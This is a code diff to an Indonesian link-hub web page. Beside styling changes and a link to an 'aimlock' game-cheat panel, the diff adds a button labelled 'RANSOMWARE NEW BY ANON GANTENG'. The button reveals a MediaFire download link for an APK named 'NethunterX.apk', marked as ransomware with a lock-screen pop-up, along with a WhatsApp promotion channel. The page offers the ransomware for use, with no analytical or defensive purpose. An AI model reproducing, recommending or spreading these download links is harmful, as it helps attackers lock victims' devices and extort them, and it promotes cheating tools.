@@ -136,26 +136,49 @@
       box-shadow: 0 0 8px #00ccff;
     }
 
-    .aimlock-button {
+    .ransomware-button {
       display: inline-block;
-      background: linear-gradient(135deg, #000000, #550000);
-      border: 1.5px solid #ff0000;
-      color: #ff0000;
+      background: linear-gradient(135deg, #4a0000, #ff0000);
+      border: 2px solid #ff0000;
+      color: white;
       padding: 12px 24px;
       font-size: 14px;
-      margin: 10px auto;
+      margin: 12px auto;
       cursor: pointer;
       border-radius: 12px;
       text-decoration: none;
-      font-weight: 600;
+      font-weight: 700;
       transition: all 0.3s ease;
-      box-shadow: 0 0 5px #ff0000, 0 0 10px #990000;
+      box-shadow: 0 0 10px #ff0000, 0 0 20px #990000;
     }
 
-    .aimlock-button:hover {
+    .ransomware-button:hover {
       transform: scale(1.08);
-      box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
-      background: linear-gradient(135deg, #1a0000, #330000);
+      box-shadow: 0 0 15px #ff0000, 0 0 25px #ff0000;
+    }
+
+    .ransomware-info {
+      margin-top: 15px;
+      padding: 12px;
+      background: rgba(0, 0, 0, 0.6);
+      border: 2px dashed #ff0000;
+      color: #fff;
+      border-radius: 10px;
+      max-width: 90%;
+      margin-left: auto;
+      margin-right: auto;
+      display: none;
+    }
+
+    .ransomware-info p {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #ffcccc;
+    }
+
+    .ransomware-info a {
+      color: #00ccff;
+      text-decoration: underline;
     }
   </style>
 </head>
@@ -184,9 +207,23 @@
     <a class="link-button" href="https://open.spotify.com/" target="_blank">SPOTIFY WEB LOGIN</a>
     <a class="link-button pink-button" href="https://vrsgfxweb.github.io/anime-menu/" target="_blank">NONTON ANIME</a>
     <a class="link-button" href="https://chat.whatsapp.com/GX9KIuzSQKN9PNOxq7uKcM" target="_blank">JOIN TRASER X4 V1 GROUP</a>
+    <a class="link-button" href="https://vrsgfxweb.github.io/Panel-vrs/" target="_blank">AIMLOCK BY VRS</a>
 
-    <!-- AIMLOCK BUTTON -->
-    <a class="aimlock-button" href="https://vrsgfxweb.github.io/Panel-vrs/" target="_blank">AIMLOCK BY VRS</a>
+    <a class="ransomware-button" href="#" onclick="showRansomwareInfo()">RANSOMWARE NEW BY ANON GANTENG</a>
+
+    <div id="ransomware-info" class="ransomware-info">
+      <p><strong>*RENSOMWARE NEW BY ANON GANTENG*</strong></p>
+      <p>*#KUNCI POP UP*</p>
+      <p>*#PisStorage*</p>
+      <p>*#Zerobrush*</p>
+      <p><code>©Anon404</code></p>
+      <p><strong>*LINK:*</strong><br>
+        <a href="https://www.mediafire.com/file/bidg53oqfii1rc2/NethunterX.apk/file" target="_blank">Download Ransomware - MediaFire</a>
+      </p>
+      <p><strong>*SUMBER ORI*</strong><br>
+        <a href="https://whatsapp.com/channel/0029Vb3Zghs1dAvv9mMkJL2T" target="_blank">WhatsApp Channel Anon Ganteng</a>
+      </p>
+    </div>
 
     <p class="footer-code">Traser website</p>
     <div class="bergerak">
@@ -194,7 +231,6 @@
     </div>
   </div>
 
-  <!-- Halaman YouTube Downloader -->
   <div id="youtube-page" class="hidden">
     <img src="https://files.catbox.moe/ro9u9z.jpg" alt="TRASER" class="logo">
     <h2 class="highlight">TRASER YOUTUBE DOWNLOADER</h2>
@@ -234,7 +270,11 @@
         alert("Masukkan URL YouTube yang valid!");
       }
     }
-  </script>
 
+    function showRansomwareInfo() {
+      const info = document.getElementById("ransomware-info");
+      info.style.display = info.style.display === "block" ? "none" : "block";
+    }
+  </script>
 </body>
-      </html>
+  </html>
